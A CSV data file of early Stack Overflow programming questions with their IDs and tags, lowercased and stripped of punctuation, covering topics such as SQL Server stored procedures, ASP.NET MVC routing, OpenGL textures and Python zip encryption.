Id,Title,Tag
13540,insert update stored proc on sql server ive written a stored proc that will do an update if a record exists otherwise it will do an insert it looks something like thisupdate mytable set col1col1 col2col2 where ididif rowcount  0insert into mytable col1 col2 values col1 col2my logic behind writing it in this way is that the update will perform an implicit select using the where clause and if that returns 0 then the insert will take placethe alternative to doing it this way would be to do a select and then based on the number of rows returned either do an update or insert this i considered inefficient because if you are to do an update it will cause 2 selects the first explicit select call and the second implicit in the where of the update if the proc were to do an insert then thered be no difference in efficiencyis my logic sound hereis this how you would combine an insert and update into a stored proc,sql
13550,case tools i was using a case called magic for a system im developing ive never used this kind of tool before and at first sight i liked a month later i had a lot of the application generated i felt very productive and  i would say  satisfiedin some way a felt uncomfortable cause there is no code and everything i was used to but in the other hand i could speed up my developing the fact is that eventually i returned to use c because i find it more flexible to develop i can make unit testing use cvs i have access to more resources and basically i had all the control i felt that this tool didnt give me confidence and i thought that later in the project i could not manage it due to its forced established rules of development and also a lot of things like sending emails using my own controls and other things had their complication it seemed that at some point it was not going to be as easy as initially i thought and as initially the product claims this reminds me a very nice article called no silver bulletthis case had its advantages but on the other hand it doesnt have resources you can consult and actually the license and certification are very expensive for me another dissapointing thing is that because of its simplistic approach for development i felt scared on first hand cause of my unexperience on these kind of tools and second cause i thought that if i continued using it maybe it would have turned to be a complex monster that i could not manage later in the projecti think its good to use these kind of solutions to speed up things but i wonder why arent these programs as popular as vsnet j2ee ruby python etc if they claim to enhace productivity better than the tools ive pointed,cad
13620,speed difference in using inline strings vs concatenation in php5 assume php5 considerltphp    foo  some words    case 1    print these are foo    case 2    print these are foo    case 3    print these are   foogtis there much of a difference between 1 and 2if not what about between 12 and 3,php
14040,developer testing vs qa team testing  what is the right division of work while trying to advocate more developer testing i find the argument isnt that qas job is used a lot  in my mind it doesnt make sense to give the qa team all testing responsibilities but at the same time spolsky and others say you shouldnt be using the 100hr developers to do something a 30hr tester could be doing  what are the experiences of others in a company with a dedicated qa team  where should the division of work be drawnclarification i meant qa as a validation and verification team devs should not be doing the validation customerfocused testing but where is the verification functional testing division point,unit-testing
14300,how do i make powershell run a batch file and then stay open for example with the old command prompt it would becmdexe k mybatchfilebat,powershell
14310,using opengl textures larger than windowdisplay size im having problems using textures that are larger than the opengl window or the display size as nondisplay render targetswhats the solution for this problem,opengl
14330,rgb to monochrome conversion how do i convert the rgb values of a pixel to a single monochrome value,colors
14350,how do i call a flex swf from a remote domain using flash as3 i have a flex swf hosted at httpwwwacomaswfi have a flash code on another doamin that tries loading the swfloader  new loadervar requrlrequest  new urlrequesthttpservicesnuconomycomnswfloadercontentloaderinfoaddeventlistenereventcompleteonloaderfinishloaderloadreqon the onloaderfinish event i try to load classes from the remote swf and create themloadercontentloaderinfoapplicationdomaingetdefinitionsomeclassname as classwhen this code runs i get the following exceptionsecurityerror error 2119 security sandbox violation caller httplocalhostservice1234flashtestmainswf cannot access loaderinfoapplicationdomain owned by httpwwwbcombswf    at flashdisplayloaderinfoget applicationdomain    at nuconomyloaderonloaderfinishis there any way to get this code working,flex
14370,glut popup menus is it easy to create glut popup menus for my opengl application if yes how,opengl
14410,why are there so few modaleditors that arent vi pretty much every other editor that isnt a vi descendant vim cream viemu seems to use the emacs shortcuts ctrlw to delete back a word and so on,vim
14530,linqtosql vs stored procedures i took a look at the beginners guide to linq post here on stackoverflow httpstackoverflowcomquestions8050beginnersguidetolinq but had a followup questionwere about to ramp up a new project where nearly all of our database ops will be fairly simple data retrievals theres another segment of the project which already writes the data most of our other projects up to this point make use of stored procedures for such things however id like to leverage linqtosql if it makes more senseso the question is this for simple data retrievals which approach is better linqtosql or stored procs any specific pros or consthanks,linq
14570,how to organize dataset queries to improve performance i dont know when to add to a dataset a tableadapter or a query from toolbox does it make any differencei also dont know where to create instances of the adapters should i do it in the pageload should i just do it when im going to use it  am i opening a new connection when i create a new instancethis doesnt seem very important but every time i create a query a little voice on my brain asks me these questions,asp.net
14760,is it possible to disable command input in the toolbar search box in the visual studio toolbar you can enter commands into the search box by prefixing them with a  symbol is there any way to disable this ive never used the feature and its slightly annoying when trying to actually search for something that you know is prefixed by greaterthan in the code its particularly annoying when you accidentally search for  exit and the ide quits i knew there was a line in the code that was something like ifcounter gt exitcount so entered that search without thinkingat the very least can you escape the  symbol so that you can search for it prefixing with  doesnt seem to work,visual-studio
14770,how best to use file version and assembly version in net there are two version numbers available when building a project file version and assembly version how are you using these numbers  keeping them the same  autoincrementing one but manually changing the otheralso what about the assemblyinformationalversion attributeid found this support microsoft knowledge base kb article that provided some help  how to use assembly version and assembly file version,.net
15040,how do you set your lamp testing server i am using xampp on windows but i would like to use something closer to my server setupfederico cargnelutti tutorial explains how to setup lamp vmware appliance it is a great introduction to vmware appliances but one of the commands was not working and it doesnt describe how to change the keyboard layout and the timezoneps the commands are easy to find but i dont want to look for them each time i reinstall the server i am using this question as a reminder,ubuntu
15190,changing current savedefault directory in delphi 2007 without using saveas i have a project group that contains a project im working on as well as some related component and packages i prefer to keep the database links active during designtime i know how to write the code which would change the database file location but in this case im just using data instead for various designtime reasons unfortunately using a relative folder means that delphi needs to be pointing to the same folder that the project is inid like to be able to force the folder location to a different root without using the save as feature does anyone happen to know where the delphi ide retrieves that info,delphi
15240,how do you create a debug only function that takes a variable argument list like printf id like to make a debug logging function with the same parameters as printf  but one that can be removed by the preprocessor during optimized buildsfor exampledebugprintwarning value d gt 3n valueive looked at variadic macros but those arent available on all platforms gcc supports them msvc does not,c++
15310,optimizing the pdf export of huge reports in sql reporting services 2005 first off i understand that it is a horrible idea to run extremely largelong running reports i am aware that microsoft has a rule of thumb stating that a ssrs report should take no longer than 30 seconds to execute  however sometimes gargantuan reports are a preferred evil due to external forces such complying with state lawsat my place of employment we have an aspnet 20 app that we have migrated from crystal reports to ssrs due to the large user base and complex reporting ui requirements we have a set of screens that accepts user inputted parameters and creates schedules to be run over night since the application supports multiple reporting frameworks we do not use the schedulingsnapshot facilities of ssrs all of the reports in the system are generated by a scheduled console app which takes user entered parameters and generates the reports with the corresponding reporting solutions the reports were created with in the case of ssrs reports the console app generates the ssrs reports and exports them as pdfs via the ssrs web service api so far ssrs has been much easier to deal with than crystal with the exception of a certain 25000 page report that we have recently converted from crystal reports to ssrs the ssrs server is a 64bit 2003 server with 32 gigs of ram running ssrs 2005 all of our smaller reports work fantastically but we are having trouble with our larger reports such as this one  unfortunately we cant seem to generate the aforemention report through the web service api the following error occurs roughly 3035 minutes into the generationexportexception message the underlying connection was closed an unexpected error occurred on a receivethe web service call is something im sure you all have seen before  data  rsrenderthisreportpath thisexportformat null deviceinfo   selectedparameters null null out encoding out mimetype out usedparameters    out warnings out streamidsthe odd thing is that this report will runrenderexport if the report is run directly on the reporting server using the report manager the proc that produces the data for the report runs for about 5 minutes the report renders in ssrs native format in the browserviewer after about 12 minutes exporting to pdf through the browserviewer in the report manager takes an additional 55 minutes this works reliably and it produces a whopping 103gb pdfhere are some of the more obvious things ive tried to get the report working via the web service api  set the httpruntime executiontimeoutvalue to 3 hours on the reportserverdisabled http keep alives on the report serverincreased the script timeout on the report serverset the report to never time out on the serverset the report timeout to several hours on the client call  from the tweaks i have tried i am fairly comfortable saying that any timeout issues have been eliminated based off of my research of the error message i believe that the web service api does not send chunked responses by default this means that it tries to send all 13gb over the wire in one response at a certain point iis throws in the towel unfortunately the api abstracts away web service configuration so i cant seem to find a way to enable response chunking does anyone know of anyway to reduceoptimize the pdf export phase and or the size of the pdf without lowering the total page countis there a way to turn on response chunking for ssrsdoes anyone else have any other theories as to why this runs on the server but not through the apiedit after reading kcrumleys post i began to take a look at the average page size by taking file size  page count interestingly enough on smaller reports the math works out so that each page is roughly 5k interestingly when the report gets larger this average increases an 8000 page report for example is averaging over 40kpage very odd i will also add that the number of records per page is set except for the last page in each grouping so its not a case where some pages have more records than another ,sql-server
15390,best practices for managing and deploying large javascript apps what are some standard practices for managing a mediumlarge javascript application my concerns are both speed for browser download and ease and maintainability of developmentour javascript code is roughly namespaced asvar client     var1    var2    accounts        100s of functions and variables       orders        100s of functions and variables and subsections        etc etc  for a couple hundred kb at the moment we have one unpacked unstripped highly readable javascript file to handle all the business logic on the web application in addition there is jquery and several jquery extensions the problem we face is that it takes forever to find anything in the javascript code and the browser still has a dozen files to downloadis it common to have a handful of source javascript files that gets compiled into one final compressed javascript file any other handy hints or best practices,javascript
15470,how do i get rid of home in aspnet mvc i know this site is written using aspnet mvc and i do not see home in the url  this proves to me that it can be done  what special route and do i need,asp.net-mvc
15690,how do you begin designing a large system its been mentioned to me that ill be the sole developer behind a large new system  among other things ill be designing a ui and database schemaim sure ill receive some guidance but id like to be able to knock their socks off  what can i do in the meantime to prepare and what will i need to keep in mind when i sit down at my computer with the speca few things to keep in mind im a college student at my first real programming job  ill be using java  we already have scm set up with automated testing etcso tools are not an issue,java
15700,runtime configuration in net specifically the entlib im looking for a way to configure a db connection at runtime specifically using the enterprise library  i see that theres a dataconfiguration or something close to this  dont recall off the top of my head assembly but am finding not much on the interwebs  complicating matters is the fact that the api help is broken on vistanow i found this workaroundconfiguration cfg  configurationmanageropenexeconfigurationconfigurationuserlevelnoneconnectionstringsettings connection  new connectionstringsettingsconnectionname  runtime connectionconnectionprovidername  systemdataoledbconnectionconnectionstring  myconstringcfgconnectionstringsconnectionstringsaddconnectioncfgsaveconfigurationsavemodemodifiedconfigurationmanagerrefreshsectionconnectionstringsvar runtimecon  databasefactorycreatedatabaseruntime connectionand although it gives me what i want it permanently edits the appconfig sure i can go back and delete the changes but id rather not go through this hassle,.net
15880,read from msg files i need to read from outlook msg file in net without using com api for outlook cos it will not be installed on the machines that my app will run are there any free 3rd party libraries to do that i want to extract from to cc and bcc fields sentreceive date fields would be good if they are also stored in msg files,c#
15900,entity diagrams in aspnet mvc whats the best waytool to display nice diagrams with entity relationships in asp mvc views  ie servers and and applications or servers with other serversare there any third party tools out there that can do this  ive been searching around things like telerik but its really hard to google for this,asp.net
16100,how do i convert a string to an enum in c whats the best way to convert a string to an enumeration value in ci have an html select tag containing the values of an enumeration when the page is posted i want to pick up the value which will be in the form of a string and convert it to the enumeration valuein an ideal world i could do something like thisstatusenum mystatus  statusenumparseactivebut that isnt valid code,c#
16110,c auto clearing winform textbox i have a user that want to be able to select a textbox and have the current text selected so that he doesnt have to highlight it all in order to change the contents  the contents need to be handle when enter is pushed  that part i think i have figured out but any suggestions would be welcome the part i need help with is that once enter has been pushed any entry into the textbox should clear the contents againedit the textbox controls an piece of rf hardware  what the user wants to be able to do is enter a setting and press enter  the setting is sent to the hardware  without doing anything else the user wants to be able to type in a new setting and press enter again,c#
16140,whats the best way to get started with osgi what makes a moduleservicebit of application functionality a particularly good candidate for an osgi module im interested in using osgi in my applications were a java shop and we use spring pretty extensively so im leaning toward using spring dynamic modules for osgitm service platforms im looking for a good way to incorporate a little bit of osgi into an application as a trial has anyone here used this or a similar osgi technology are there any pitfalls nicolas  thanks ive seen that one its a good tutorial but im looking more for ideas on how to do my first real osgi bundle as opposed to a hello world exampledavid  thanks for the link ideally with a greenfield app id design the whole thing to be dynamic what im looking for right now though is to introduce it in a small piece of an existing application assuming i can pick any piece of the app what are some factors to consider that would make that piece better or worse as an osgi guinea pig,java
16320,should db layer members be static or instance ive seen projects where the classes in the db layer have just static functions in them and other projects where those classes need to be instantiated to get access to the member functions which is better and why,database
16330,how do i handle page flow in mvc particularly aspnet if you had to provide a wizard like form entry experience in mvc how would you abstract the page flow,asp.net-mvc
16340,how do i generate a hashcode from a byte array in c say i have an object that stores a byte array and i want to be able to efficiently generate a hashcode for it ive used the cryptographic hash functions for this in the past because they are easy to implement but they are doing a lot more work than they should to be cryptographically oneway and i dont care about that im just using the hashcode as a key into a hashtableheres what i have todaystruct somedata  iequatableltsomedatagt    private readonly byte data    public somedatabyte data            if null  data  datalength lt 0                    throw new argumentexceptiondata                thisdata  new bytedatalength        arraycopydata thisdata datalength        public override bool equalsobject obj            return obj is somedata ampamp equalssomedataobj        public bool equalssomedata other            if otherdatalength  datalength                    return false                for int i  0 i lt datalength i                    if datai  otherdatai                            return false                            return true        public override int gethashcode            return bitconvertertoint32new md5cryptoserviceprovidercomputehashdata 0    any thoughtsdp you are right that i missed a check in equals i have updated it  using the existing hashcode from the byte array will result in reference equality or at least that same concept translated to hashcodesfor examplebyte b1  new byte  1 byte b2  new byte  1 int h1  b1gethashcodeint h2  b2gethashcodewith that code despite the two byte arrays having the same values within them they are referring to different parts of memory and will result in probably different hash codes i need the hash codes for two byte arrays with the same contents to be equal,c#
16460,removing n items from a list conditionally i was writing some aspnet control when i came to the scenario where i needed to remove items from a list only when they matched a certain conditionthe removeall method of the generic list class does a good job but removes all items that match the condition specified by the predicatewhat if i want to only remove a certain number of items specifying the condition what do you think is the best way to do this,.net
16550,best net build tool   possible duplicate  nant or msbuild which one to choose and when  what is the best build tool for neti currently use nant but only because i have experience with ant is msbuild preferred,.net
16610,how do you deal with transportlevel errors in sqlconnection every now and then in a high volume net application you might see this exception when you try to execute a query  systemdatasqlclientsqlexception  a transportlevel error has  occurred when sending the request to the serveraccording to my research this is something that just happens and not much can be done to prevent it  it does not happen as a result of a bad query and generally cannot be duplicated  it just crops up maybe once every few days in a busy oltp system when the tcp connection to the database goes bad for some reasoni am forced to detect this error by parsing the exception message and then retrying the entire operation from scratch to include using a new connection  none of that is prettyanybody have any alternate solutions,c#
16660,internationalization in ssrs whats the best way to handle translations for stock text in a ssrs for instance  if i have a report that shows a grid of contents whats the best way to have the correct translation for the header of that grid show up assuming the culture of the report is set correctlyput another way  is it possible to do resources in a ssrs report or am i stuck with storing all that text in the database and querying for it,reporting-services
16770,haskells algebraic data types im trying to fully understand all of haskells conceptsin what ways are algebraic data types similar to generic types eg in c and java and how are they different whats so algebraic about them anyway im familiar with universal algebra and its rings and fields but i only have a vague idea of how haskells types work,data-structures
16860,getting started with unit testing   unit testing is roughly speaking testing bits of your code in isolation with test code the immediate advantages that come to mind are      running the tests becomes automateable and repeatable  you can test at a much more granular level than pointandclick testing via a gui      rytmismy question is what are the current best practices in terms of tools as well as when and where to use unit testing as part of your daily codinglets try to be somewhat language agnostic and cover all the bases,unit-testing
16940,vs 2008  detachable code tabs admittedly this might not be a problem on larger screens but my employer is abit tight and refuses to buy monitors larger than 19inch this means that i dont have much screen real estate to view all the visual studio windows and my code at the same time or two pieces of code at once is there anything that allows me to detach the code panels so that i can view two different classes at once on each of my screens ,visual-studio-2008
16970,recommended notesdoc service that offers an api im looking for a good online service for notesdocuments think google docs that has a decent web ui and offers an api for clients to readwrite the stored datagoogle docs is almost perfect  except theres no way to update the contents of existing documents,api
17020,what is the best way to partition terabyte drive in a linux development machine i have a new 1 tb drive coming in tomorrow what is the best way to divide this space for a development workstationthe biggest problem i think im going to have is that some partitions probably usr will become to small after a bit of use other partitions are probably to huge the swap drive for example is currently 2gb 2x 1gb ram but it is almost never used only once that i know of,linux
17140,how do you spawn another process in c how do you run an external program and pass it command line parameters using c if you have to use operating system api include a solution for windows mac and linux,c
17170,when to use ilist and when to use list i know that ilist is the interface and list is the concrete type but i still dont know when to use each one what im doing now is if i dont need the sort or findall methods i use the interface am i right is there a better way to decide when to use the interface or the concrete type,c#
17250,create an encrypted zip file in python im creating an zip file with zipfile in python 25 it works ok so farimport zipfile oslocfile  testtxtloczip  ospathsplitext locfile0  zipzip  zipfilezipfile loczip wzipwrite locfilezipclosebut i couldnt find how to encrypt the files in the zip filei could use system and call pkzip s but i suppose there must be a more pythonic way  im looking for an open source solution,python
17320,what areas of specialization within programming would you recommend to a beginner i am a student studying software development and i feel programming in general is too broad of a subject to try to know everything to be proficient you have to decide which areas to focus your learning and understanding certain skill sets synergize with each other like datadriven web development and sql experience however all the win32 api experience in the world may not directly apply to linux development this leads me to believe as a beginning programmer i should start deciding where i want to specialize after i have general understanding of the basic principles of software development this is a multipart question really what are the common specializations within computer programming and software development  which of these specializations have more longterm value both as a foundation for other specializations andor as marketable skills which skill sets complement each other are there any areas of specialization that hinder your ability of developing other areas of specialization,language-agnostic
17370,using glew to use opengl extensions under windows ive been using opengl extensions on windows the painful way is glew the easier way to go how do i get started with it,opengl
17430,language conversion testing we created a tool which converts a language called p2 a language similar to assembly which i think exists only in japan to c there are at least a hundred modules written in p2 and we want to verify if the conversion to c is right how can we test this,c#
17500,why are dispatcherobjectcheckaccess and verifyaccess hidden from intellisense the systemwindowsthreadingdispatcherobject class which dependencyobject is based on contains a useful function called checkaccess that determines whether or not the code is running on the ui threadwhen i wanted to use it yesterday i was puzzled to find out that intellisense didnt show the function nor verifyaccess which throws an exception when not on the ui thread even though the msdn library lists it i decided to investigate the class using reflector it seems that the function in question has an editorbrowsableeditorbrowsablestatenever attribute attached to it the dispatcher class which is used by dispatcherobject has the same attribute attached to checkaccess and verifyaccesspublic abstract class dispatcherobject         editorbrowsableeditorbrowsablestatenever    public bool checkaccess    editorbrowsableeditorbrowsablestatenever    public void verifyaccess         editorbrowsableeditorbrowsablestateadvanced    public dispatcher dispatcher  get public sealed class dispatcher         editorbrowsableeditorbrowsablestatenever    public bool checkaccess    editorbrowsableeditorbrowsablestatenever    public void verifyaccess     i dont believe that the application of that attribute is random or a joke so my question is why is it there should those methods not be called directly then why arent they protected or internal like some of the most useful methods in the wpf,.net-3.5
17670,suitable alternative to cryptencrypt we have a situation in our product where for a long time some data has been stored in the applications database as sql string choice of ms sql server or sybase sql anywhere which was encrypted via the windows api function cryptencrypt  direct and decryptablethe problem is that cryptencrypt can produce nulls in the output meaning that when its stored in the database the string manipulations will at some point truncate the ciphertextideally wed like to use an algo that will produce cyphertext that doesnt contain nulls as that will cause the least amount of change to the existing databases changing a column from string to binary and code to deal with binary instead of strings and just decrypt existing data and reencrypt with the new algo at database upgrade timethe algorithm doesnt need to be the most secure as the database is already in a reasonably secure environment not an open network  teh interwebs but does need to bebetter than rot13 which i can almost decrypt in my head nowcheersedit btw any particular reason for changing ciphertext to cyphertext ciphertext seems more widely used,c++
17770,tracking useful information what do the clever programmers here do to keep track of handy programming tricks and useful information they pick up over their many years of experience things like useful compiler arguments ide shortcuts clever code snippets etci sometimes find myself frustrated when looking up something that i used to know a year or two ago my ie favourites probably represent a good chunk of the internet in the late 1990s so clearly that isnt effective at least for me or am i just getting oldso what do you do,knowledge-management
17840,how can i learn about parser combinators ive found a few resources on the subject but they all require a deep understanding of smalltalk or haskell neither of which i know,parsing
17870,select  where  or  is there a way to select data where any one of multiple conditions occur on the same fieldexample i would typically write a statement such asselect  from table where field  1 or field  2 or field  3is there a way to instead say something likeselect  from table where field  1  2  3any help is appreciated,mysql
17880,mac iworkpages automation there is a rich scripting model for microsoft office but not so with apple iwork and specifically the word processor pages while there are some applescript hooks it looks like the best approach is to manipulate the underlying xml datathis turns out to be pretty ugly because for example page breaks are stored in xml so for example you have something like we hold these truths to be self evident that ltpagegtltpagegtall men are created equal and are so if you want to add or remove text you have to move the startend tags around based on the size of the text on the page this is pretty impossible without computing the number of words a page can hold which seems wildly inelegantanybody have any thoughts on this,xml
17960,powershell appconfig has anyone worked out how to get powershell to use appconfig files i have a couple of net dlls id like to use in one of my scripts but they expect their own config sections to be present in appconfigwebconfig,powershell
17980,what comes after the  ive searched for this a little but i have not gotten a particularly straight answer in c and i guess c how do you determine what comes after the  when using printf for exampledouble radius  10double area  00area  calculatearea radius printf 101f     102n radius area i took this example straight from a book that i have on the c language this does not make sense to me at all where do you come up with 101f and 102f could someone please explain this,c
18010,is ankhsvn any good i asked a couple of coworkers about ankhsvn and neither one of them was happy with it one of them went as far as saying that ankhsvn has messed up his devenv several timeswhats your experience with ankhsvn i really miss having an ide integrated source control tool,version-control
18080,best traffic  performance  usage monitoring module are there any open source or i guess commercial packages that you can plug into your site for monitoring purposes id like something that we can hook up to our aspnet site and use to provide reporting on things likeperformance over timecurrent loadpage trafficsql performancepu time monitoring ideally in c with some sexy graphsedit id also be happy with a package that i can feed statistics and views of data to and it would analyse trends spot abnormal behaviour eg no one has logged in for the last hour is this ok high traffic levels detected low number of api calls detected  and generally be very useful indeed does such a thing existat my last office we had a big screen which showed us loads and loads of performance counters over a couple of time ranges and we could spot weird stuff happening but the data was not stored and there was no way to report on it its a package for doing this that im after,performance
18250,creation date of compiled executable vc 2005 the creation date of an executable linked in vs2005 is not set to the real creationdate of the exefile only a complete rebuild will set the current date a relink will not do it obviously the file is set to some date which is taken from one of the projectfiles so is there a way to force the linker to set the creationdate to the real linkdate,date
18290,how do you secure databaseyml within ruby on rails applications databaseyml is a plain text file that stores database credentialswhen i deploy my rails applications i have an after deploy callback in my capistrano recipe that creates a symbolic link within the applications config directory to the databaseyml file the file itself is stored in a separate directory thats outside the standard capistrano releases directory structure i chmod 400 the file so its only readable by the user who created itis this sufficient to lock it down if not what else do you dois anyone encrypting their databaseyml files,ruby-on-rails
18450,is mono ready for prime time has anyone used mono the open source net implementation on a large or medium sized project im wondering if its ready for real world production environments is it stable fast compatible  enough to use does it take a lot of effort to port projects to the mono runtime or is it really really compatible enough to just take of and run already written code for microsofts runtime,.net
18460,best practise to authorize all users for just one page what is the best way to authorize all users to one single page in a aspnet websitefor except the login page and one other page i deny all users from viewing pages in the website how do you make this page accessible to all users,asp.net
18700,arguments for going open source ive spent my downtime at work this summer writing a framework of sorts for facilitating my day to day work in short it loads a xml with markup that defines the blocks of the site their content and the styling of these very similar to html handles the loading of assets and suchnow im rather pleased with how this is turning out and ive been itching to release some of my code for public use and scrutiny im also reasonably sure that it fills a void for quick and easy construction of sites or parts of themwhat would be the best arguments to convince my bosscoworkers that releasing this under an open source license is a good idea,open-source
18920,can you set or where is the local document root when opening a file from your hard drive into your browser where is the document root  to illustrate given the following html code if the page is opened from the local machinefile then where should the css file be for the browser to find itltlink hreftemptestcss relstylesheet typetextcss gt,html
19030,how to check set of files conform to a naming scheme i have a bunch of files tv episodes although that is fairly arbitrary that i want to check match a specific namingorganisation schemecurrently i have three arrays of regex one for valid filenames one for files missing an episode name and one for valid pathsthen i loop though each validfilename regex if it matches append it to a valid dict if not do the same with the missingepname regexs if it matches this i append it to an invalid dict with an error code 2missing epsiode name if it matches neither it gets added to invalid with the malformed name error codethe current code can be found herei want to add a rule that checks for the presence of a folderjpg file in each directory but to add this would make the code substantially more messy in its current state how could i write this system in a more expandable waythe rules it needs to check would befile is in the format show name  01x23  episode nameavi or show name  01xspecial02  special nameavi or show name  01xextra01  extra nameaviif filename is in the format show name  01x23avi display it a missing episode name section of the outputthe path should be in the format show nameseason 2thefileavi where season 2 should be the correct season number in the filenameeach show nameseason 1 folder should contain folderjpgany ideas while im trying to check tv episodes this conceptcode should be able to apply to many thingsthe only thought i had was a list of dicts in the formatchecker      namevalid files    typefile    functioncheckvalid  runs checkvalid on all files    status0  if it returns true this is the status the file gets,python
19280,code to ask yesno question in javascript i could only find the function confirm that gives okcancel buttons is there any way to give yesno buttons,javascript
19790,display rows in multiple columns in aspnet gridview by default each row of a gridview maps to each row in a datatable or dataset attached to its datasource but what if i want to display these rows in multiple columns for example if it has 10 rows 5 rows each should be displayed in 2 columns side by side also can i do this with the infragistics grid is this possible,asp.net
19970,best way to keep an ordered list of windows from mostrecently created to oldest what is the best way to manage a list of windows keeping them in order to be able to promote the next window to the toplevel when the current toplevel window is closedthis is for a web application so were using jquery javascriptwed talked through a few simplistic solutions such as using an array and just treating 0 index as the topmost windowim wondering if theres any potentially more efficient or useful alternative to what we had brainstormed,javascript
20040,what are the most important things to learn about net as a project manager thinking about getting into net technology project managementive had plenty of experience with php projects im aware of most of the existing frameworks and libraries and ive written specs and case studies based on this knowledgewhat should i know about netwhich top resources would you recommend me to know so i can rapidly learn and later stay up to date on the technologyedit 82408 the answers i got so far essentially discuss being a good pm thanks but this is not what i meant any net essentials would be appreciated,.net
20420,any resharper equivalent for xcode im a complete xcodeobjectiveccocoa newbie but im learning fast and really starting to enjoy getting to grips with a new language platform and paradigmone thing is though having been using visual studio with r for so long ive kind of been spoiled with the coding tools such as refactorings and completion etc and as far as i can tell xcode has some fairly limited built in support for this stuffon that note does anyone know if any addins or whatever are available for the xcode environment which add coding helpers such as automatically generating implementation skeletons from a class interface definition etc i suspect there arent but i suppose it cant help to ask,objective-c
20450,cleaning up rtf text id like to take some rtf input and clean it to remove all rtf formatting except ul b i to paste it into word with minor format informationthe command used to paste into word will be something likeowordactivedocumentactivewindowselectionpasteandformat0 with some rtf text already in the clipboardrtf1ansideff0fonttblf0fnilfcharset0 courier newcolortbl red255green255blue140viewkind4uc1pardhighlight1lang3084f0fs18 the company is a global leader in responsible tourism and was ul the first major hotel chain in north americaulnone  to embrace environmental stewardship within its daily operationshighlight0pardo you have any idea on how i can clean up the rtf safely with some regular expressions or something i am using vbnet to do the processing but any net language sample will do,.net
20510,executing javascript from flex is this javascript function dangerous i have a flex application that needs the ability to generate and execute javascript when i say this i mean i need to execute raw javascript that i create in my flex application not just an existing javascript methodi am currently doing this by exposing the following javascript methodfunction doscriptjs evaljsi can then do something like this in flex note i am doing something more substantial then an alert box in the real flex appexternalinterfacecalldoscriptalertfoomy question is does this impose any security risk i am assuming its not since the flex and jasvascript all run client sideis there a better way to do this,javascript
20840,sql server  dirty reads pros  cons why should i or shouldnt i use dirty readsset transaction isolation level read uncommittedin sql server,sql
20850,how to stop ntfs volume automounting on os x im a bit newbieish when it comes to the deeper parts of osx configuration and am having to put up with a fairly irritating niggle which while i can put up with it i know under windows i could have sorted in minutesbasically i have an external disk with two volumes one is an hfs volume which i use for timemachine backupsthe other an ntfs volume that i use for general file copying etc on mac and windows boxesso what happens is that whenever i plug in the disk into my mac usb osx goes off and mounts both volumes and shows an icon on the desktop for each the thing is that to remove the disk you have to eject the volume and in this case do it for both volumes which causes an annoying warning dialog to be shown every time what id prefer is some way to prevent the ntfs volume from automounting altogether ive done some hefty googling and heres a list of things ive tried so farive tried going through options in disk utilityive tried setting automount to no in etchostconfig but that is a bit too global for my likingive also tried the suggested approach to putting settings in fstab but it appears the osx 105 is ignoring these settingsany other suggestions would be welcomed just a little dissapointed that i cant just tick a box somewhere or untickedit thanks heaps to hop for the answer it worked a treat for the record it turns out that it wasnt osx not picking up the settings i actually had msdos instead of ntfs in the fs type column,osx
20880,java jpanel redraw issues i have a java swing application with a panel that contains three jcomboboxes that do not draw properlythe combox boxes just show up as the down arrow on the right side but without the label of the currently selected valuethe boxes will redraw correctly if the window is resized either bigger or smaller by even one pixelall of my googling has pointed to calling revalidate on the jpanel to fix this but that hasnt worked for mecalling updateui on the jpanel has changed it from always displaying incorrectly to displaying incorrectly half of the time  has anyone else seen this and found a different way to force a redraw of the combo boxes,java
